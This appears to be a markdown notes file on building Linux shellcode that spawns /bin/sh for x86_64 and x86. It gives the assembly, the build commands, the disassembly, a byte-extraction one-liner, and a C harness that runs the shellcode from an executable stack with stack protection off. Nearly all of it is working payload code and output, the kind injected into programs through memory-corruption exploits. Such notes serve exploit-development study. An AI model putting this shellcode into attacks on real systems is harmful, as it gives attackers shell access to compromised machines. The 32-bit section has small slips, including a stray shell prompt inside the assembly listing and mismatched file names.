# &#35; linux x86_64
#### Linux system call table : <https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md/>
#### get shellcode to binary : <https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump>

```bash
$ cat shell64.s
; nasm -f elf64 shell64.s -o shell64.o
; ld shell64.o -o shell64
; echo "\"$(objdump -d ./shell64 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""

global _start
section .text
_start:
  xor rsi,rsi                   ; xor = 0
  push rsi                      ; push 0x0(null) on stack
  mov rdi,0x68732f2f6e69622f
  push rdi                      ; push /bin/sh + 0x0(null)
  push rsp
  pop rdi                       ; sp direct /bin/sh
  push 59                       ; sys_execve
  pop rax
  cdq
  syscall


$ nasm -f elf64 shell64.s -o shell64.o
$ ld shell64.o -o shell64
$ ./shell64
$ id
uid=1000(user) gid=1000(user) groups=1000(user)

$ objdump -M intel -D ./shell64

./shell64:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:	48 31 f6             	xor    rsi,rsi
  401003:	56                   	push   rsi
  401004:	48 bf 2f 62 69 6e 2f 	movabs rdi,0x68732f2f6e69622f
  40100b:	2f 73 68
  40100e:	57                   	push   rdi
  40100f:	54                   	push   rsp
  401010:	5f                   	pop    rdi
  401011:	6a 3b                	push   0x3b
  401013:	58                   	pop    rax
  401014:	99                   	cdq
  401015:	0f 05                	syscall

$ echo "\"$(objdump -d ./shell64 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"


$ cat shell.c
// gcc -m64 -fno-stack-protector -z execstack shell.c -o shell
#include <stdio.h>

int main()
{
    unsigned char shellcode[] = \
        "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
    int (*ret)() = (int(*)())shellcode;
    ret();
}

$ gcc -m64 -fno-stack-protector -z execstack shell.c -o shell
$ ./shell
$ id
uid=1000(user) gid=1000(user) groups=1000(user)

```


# &#35; linux x86
#### Linux system call table : <https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md/>
#### get shellcode to binary : <https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump>

```bash
$ cat shell32.s
; nasm -f elf32 shell32.s -o shell32.o
; ld -m elf_i386 -s shell32.o -o shell32
; echo "\"$(objdump -d ./shell32 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""


section .text
    global _start

_start:
    xor eax,eax		; safe null
    push eax		; push null byte onto stack
    push 0x68732f2f 	; push /bin//sh
    push 0x6e69622f
    mov ebx,esp		; set ebx to out cmd
    mov ecx,eax		; no args
    mov edx,eax		; no args again
    mov al,0xb		; set sys_execve
    int 0x80
user@pwn:/pwn/shell$


$ nasm -f elf32 shell32.s -o shell32.o
$ ld -m elf_i386 -s shell32.o -o shell32
$ ./shell32
$ id
uid=1000(user) gid=1000(user) groups=1000(user)

$ objdump -M intel -D ./shell32

./shell32:     file format elf32-i386


Disassembly of section .text:

08049000 <.text>:
 8049000:	31 c0                	xor    eax,eax
 8049002:	50                   	push   eax
 8049003:	68 2f 2f 73 68       	push   0x68732f2f
 8049008:	68 2f 62 69 6e       	push   0x6e69622f
 804900d:	89 e3                	mov    ebx,esp
 804900f:	89 c1                	mov    ecx,eax
 8049011:	89 c2                	mov    edx,eax
 8049013:	b0 0b                	mov    al,0xb
 8049015:	cd 80                	int    0x80
 

$ echo "\"$(objdump -d ./shell32 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"


$ cat shell.c
// gcc -m32 -fno-stack-protector -z execstack shell32.c -o shell32
#include <stdio.h>

int main()
{
    unsigned char shellcode[] = \
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
    int (*ret)() = (int(*)())shellcode;
    ret();
}


$ gcc -m32 -fno-stack-protector -z execstack shell32.c -o shell32
$ ./shell32
$ id
uid=1000(user) gid=1000(user) groups=1000(user)

```
